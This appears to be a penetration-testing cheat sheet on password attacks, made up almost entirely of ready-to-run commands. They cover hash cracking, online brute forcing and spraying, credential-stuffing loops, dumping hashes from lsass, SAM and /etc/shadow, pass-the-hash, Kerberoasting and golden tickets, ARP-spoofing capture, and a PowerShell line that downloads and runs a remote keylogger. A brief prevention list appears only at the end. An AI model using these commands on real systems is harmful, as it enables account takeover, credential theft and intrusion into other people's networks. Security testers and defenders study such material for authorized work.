# Password Attacks & Credential Testing

## Overview

Password attacks involve attempting to discover or crack passwords through various techniques including brute force, dictionary attacks, and hash cracking.

---

## Password Cracking Tools

### John the Ripper
```bash
# Basic usage
john hashes.txt

# Specify wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Specify hash format
john --format=raw-md5 hashes.txt
john --format=NT hashes.txt

# Show cracked passwords
john --show hashes.txt

# Incremental mode (brute force)
john --incremental hashes.txt

# Rule-based attack
john --wordlist=wordlist.txt --rules hashes.txt

# Custom rules
john --wordlist=wordlist.txt --rules=JumboSingle hashes.txt
```

### Hashcat
```bash
# Basic usage
hashcat -m <hash_type> -a <attack_mode> hashes.txt wordlist.txt

# Common hash types
-m 0     # MD5
-m 100   # SHA1
-m 1000  # NTLM
-m 1800  # SHA-512(Unix)
-m 3200  # bcrypt
-m 13100 # Kerberos TGS-REP

# Attack modes
-a 0  # Straight (dictionary)
-a 1  # Combination
-a 3  # Brute-force
-a 6  # Hybrid Wordlist + Mask
-a 7  # Hybrid Mask + Wordlist

# Dictionary attack
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt

# Brute force attack
hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a

# Mask attack (e.g., Password + 2 digits)
hashcat -m 0 hashes.txt -a 3 Password?d?d

# Rule-based attack
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule

# Show results
hashcat -m 1000 hashes.txt --show

# GPU acceleration
hashcat -m 1000 hashes.txt wordlist.txt -O  # Optimized kernels
hashcat -m 1000 hashes.txt wordlist.txt -w 3  # Workload profile
```

---

## Online Password Attacks

### Hydra
```bash
# SSH brute force
hydra -l username -P passwords.txt ssh://target

# HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# HTTP Basic Auth
hydra -l admin -P passwords.txt target.com http-get /admin

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://target

# SMB brute force
hydra -L users.txt -P passwords.txt smb://target

# RDP brute force
hydra -l administrator -P passwords.txt rdp://target

# MySQL brute force
hydra -l root -P passwords.txt mysql://target

# Multiple users and passwords
hydra -L users.txt -P passwords.txt ssh://target

# Custom login parameters
hydra -l admin -P pass.txt target http-post-form "/login.php:user=^USER^&pass=^PASS^:S=302"
```

### Medusa
```bash
# SSH brute force
medusa -h target -u admin -P passwords.txt -M ssh

# HTTP brute force
medusa -h target -u admin -P passwords.txt -M http -m DIR:/admin

# FTP brute force
medusa -h target -U users.txt -P passwords.txt -M ftp

# Multiple hosts
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh
```

### Ncrack
```bash
# SSH brute force
ncrack -p 22 --user admin -P passwords.txt target

# RDP brute force
ncrack -p 3389 --user administrator -P passwords.txt target

# Multiple services
ncrack -p ssh:22,rdp:3389 -u admin -P passwords.txt target
```

### CrackMapExec
```bash
# SMB password spraying
crackmapexec smb target -u users.txt -p 'Password123'

# SMB brute force
crackmapexec smb target -u admin -p passwords.txt

# Pass-the-Hash
crackmapexec smb target -u admin -H <NTLM_hash>

# Password spraying across network
crackmapexec smb 192.168.1.0/24 -u admin -p 'Summer2023!'

# Check for admin access
crackmapexec smb target -u admin -p password --local-auth

# Execute commands
crackmapexec smb target -u admin -p password -x "whoami"
```

---

## Hash Identification

### hash-identifier
```bash
hash-identifier
# Paste hash and it will identify the type
```

### hashid
```bash
hashid <hash>
hashid -m <hash>  # Show hashcat modes
```

### Manual identification
```
MD5: 32 characters (e.g., 5f4dcc3b5aa765d61d8327deb882cf99)
SHA1: 40 characters
SHA256: 64 characters
NTLM: 32 characters (similar to MD5)
bcrypt: Starts with $2a$ or $2b$
SHA-512(Unix): Starts with $6$
```

---

## Hash Extraction

### Windows Hashes
```bash
# Metasploit
meterpreter> hashdump
meterpreter> run post/windows/gather/smart_hashdump

# Mimikatz
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam

# Extract from SAM/SYSTEM files
samdump2 SYSTEM SAM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# From memory
procdump64.exe -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp
mimikatz# sekurlsa::logonpasswords

# Remote hash dumping
impacket-secretsdump domain/user:password@target
crackmapexec smb target -u admin -p password --sam
```

### Linux Hashes
```bash
# /etc/shadow (requires root)
cat /etc/shadow

# Unshadow (combine passwd and shadow)
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt

# Extract from backup
strings backup.tar.gz | grep "^\$6\$"
```

### Web Application Hashes
```bash
# SQL injection to extract hashes
SELECT username, password FROM users;

# Local file inclusion
http://target/page?file=../../../../etc/shadow

# Configuration files
config.php
web.config
database.yml
```

---

## Password Spraying

### Concept
Test one password against many usernames (avoid account lockout)

```bash
# CrackMapExec
crackmapexec smb targets.txt -u users.txt -p 'Winter2023!'

# Spray (Python tool)
spray.py -h target -u users.txt -p 'Password123' -s smb

# Custom spray script
for user in $(cat users.txt); do
    hydra -l $user -p 'Password123' ssh://target
    sleep 30  # Delay between attempts
done
```

### Common Password Patterns
```
Season + Year (Summer2023, Winter2024)
Company name + year (Acme2023)
Password1, Password123
Welcome1, Welcome123
Qwerty123
Month + Year (January2023)
```

---

## Credential Stuffing

### Concept
Use leaked credentials from breaches to access other services

```bash
# Check if credentials are breached
# Have I Been Pwned API
curl "https://api.pwnedpasswords.com/range/HASH"

# Credential stuffing tools
# Sentry MBA, SNIPR, etc. (use ethically in authorized tests)

# Test credentials
for cred in $(cat credentials.txt); do
    username=$(echo $cred | cut -d':' -f1)
    password=$(echo $cred | cut -d':' -f2)
    curl -X POST -d "user=$username&pass=$password" http://target/login
done
```

---

## Rainbow Tables

```bash
# Generate rainbow tables
rtgen md5 loweralpha 1 7 0 1000 1000000 0

# Crack with rainbow tables
rcrack *.rt -h <hash>

# Online rainbow tables
# CrackStation
# cmd5.org
```

---

## Custom Wordlist Generation

### CeWL (Web crawler wordlist)
```bash
cewl http://target.com -w wordlist.txt
cewl http://target.com -d 3 -m 5 -w wordlist.txt  # Depth 3, min 5 chars
cewl http://target.com --with-numbers -w wordlist.txt
```

### Crunch (Pattern-based)
```bash
# Generate all 4-digit PINs
crunch 4 4 0123456789 -o pins.txt

# Generate passwords 6-8 chars with lowercase
crunch 6 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# Pattern-based generation
crunch 8 8 -t pass%%%% -o wordlist.txt  # pass0000 to pass9999
crunch 10 10 -t 2023@@@@@ -o wordlist.txt  # 2023 + 5 lowercase letters

# Character sets
@ = lowercase
, = uppercase
% = numbers
^ = symbols
```

### CUPP (User profiling)
```bash
cupp -i  # Interactive mode
# Enter personal information about target
# Generates personalized wordlist
```

### Mentalist
```
# GUI-based wordlist generator
# Uses rules and attributes
mentalist
```

### Maskprocessor
```bash
# Generate based on masks
mp64 ?l?l?l?l?d?d  # 4 lowercase + 2 digits
mp64 -1 ?l?u ?1?1?1?1?d?d  # Mixed case
```

---

## Password Rules

### John the Ripper Rules
```bash
# Common rules in john.conf
# Append numbers
$[0-9]

# Prepend numbers
^[0-9]

# Capitalize first letter
c

# Duplicate word
d

# Reverse word
r

# Custom rules file
[List.Rules:Custom]
Az"[0-9][0-9]"
cAz"[0-9][0-9][0-9]"
```

### Hashcat Rules
```bash
# Use built-in rules
hashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Common rules
# Append digit: $1
# Capitalize: c
# Toggle case: t
# Duplicate: d
```

---

## Pass-the-Hash

```bash
# PSExec with PTH
pth-winexe -U 'DOMAIN/user%hash' //target cmd

# WMI exec with PTH
pth-wmis -U 'DOMAIN/user%hash' //target cmd

# RDP with PTH
xfreerdp /u:user /d:DOMAIN /pth:<NTLM> /v:target

# Impacket PSExec
impacket-psexec -hashes :<NTLM> user@target

# CrackMapExec
crackmapexec smb target -u user -H <NTLM>
```

---

## Kerberos Attacks

### AS-REP Roasting
```bash
# Find users without Kerberos pre-authentication
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip dc_ip

# Crack obtained hashes
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Kerberoasting
```bash
# Request TGS tickets
impacket-GetUserSPNs domain.local/user:password -dc-ip dc_ip -request

# Crack TGS tickets
hashcat -m 13100 tgs_hashes.txt wordlist.txt
```

### Golden Ticket
```bash
# Create golden ticket (requires krbtgt hash)
mimikatz# kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt
```

### Silver Ticket
```bash
# Create silver ticket (requires service hash)
mimikatz# kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:http /rc4:<hash> /ptt
```

---

## Default Credentials

### Common Default Passwords
```
admin:admin
admin:password
administrator:administrator
root:root
root:toor
admin:12345
admin:(blank)
guest:guest
```

### Databases
- [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- CIRT.net Default Password List
- SecLists default passwords

---

## Wordlists

### Common Wordlists
```bash
# RockYou (most popular)
/usr/share/wordlists/rockyou.txt

# SecLists
/usr/share/seclists/Passwords/

# Daniel Miessler's SecLists
- Common-Credentials
- Leaked-Databases
- Default-Credentials
```

### Download Wordlists
```bash
# RockYou
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# SecLists
git clone https://github.com/danielmiessler/SecLists.git
```

---

## Password Policy Analysis

```bash
# Enum4linux (Linux/SMB)
enum4linux -P target

# CrackMapExec
crackmapexec smb target --pass-pol

# LDAP query
ldapsearch -x -h target -b "DC=domain,DC=local" -s sub "(objectClass=*)" pwdProperties

# PowerView (Windows)
Get-DomainPolicy
```

---

## Credential Harvesting

### Network Sniffing
```bash
# Ettercap
ettercap -T -M arp:remote /target// -F filter.ef

# Wireshark filters
http.request.method == "POST"
ftp-data contains "password"
```

### Phishing
```bash
# Gophish (phishing framework)
# Social Engineering Toolkit (SET)
setoolkit
# Choose phishing attack vectors
```

### Keylogging
```bash
# Windows
# PowerSploit Get-Keystrokes
powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://server/Get-Keystrokes.ps1'); Get-Keystrokes

# Linux
# logkeys
sudo logkeys --start
sudo logkeys --output /tmp/log.txt
```

---

## Multi-Factor Authentication Bypass

- MFA fatigue attacks
- Session hijacking post-MFA
- OAuth token theft
- Backup codes
- Password reset abuse
- Social engineering

---

## Password Attack Prevention

1. Strong password policies
2. Account lockout policies
3. Multi-factor authentication
4. Rate limiting
5. Password complexity requirements
6. Regular password rotation
7. Monitoring for brute force attempts
8. CAPTCHA on login forms
9. Geo-blocking suspicious locations
10. Security awareness training

---

## Further Reading

- Password Cracking Guide (InfoSec Institute)
- NIST Password Guidelines
- OWASP Authentication Cheat Sheet
